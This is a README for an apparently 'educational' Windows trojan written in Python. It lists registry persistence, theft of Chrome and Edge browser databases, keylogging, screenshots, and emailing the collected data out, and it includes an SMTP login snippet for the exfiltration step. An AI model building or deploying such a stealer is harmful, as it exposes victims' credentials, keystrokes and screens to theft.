# Trojan (Educational Project) 

### Disclaimer
This project is created **only for educational and research purposes**.  
It demonstrates how malware *might* behave, to help students and security researchers understand:
- Windows registry persistence
- Keylogging techniques
- Data exfiltration mechanisms
- Multi-threaded execution

**Do not use this project for malicious purposes.**  
Running such software outside a controlled lab environment can be **illegal**.

---

## How It Works (Simulation)

On Windows, the program simulates typical behaviors of a trojan:

1. Registers itself in Windows startup (persistence simulation).
2. Reads browser databases (Google, Edge) and stores locally.
3. Starts a keylogger (demo).
4. Periodically "exfiltrates" data (here: to an email).
5. Takes screenshots and manages them in a loop.
6. Runs in multiple threads (simultaneous processes).

---

## Educational Use

- Security students can analyze **how trojans hide and persist**.
- Researchers can test **detection techniques** in antiviruses.
- Developers can understand **multi-threaded system-level programming**.

---

## Configuration (for lab testing only )

In the `__send_file__` function, replace placeholders with test credentials (e.g., a throwaway Gmail account with an app password):

```python
msg['From'] = 'your_test_email'
msg['To'] = 'your_test_email'
server.login('your_test_email', 'password_app')
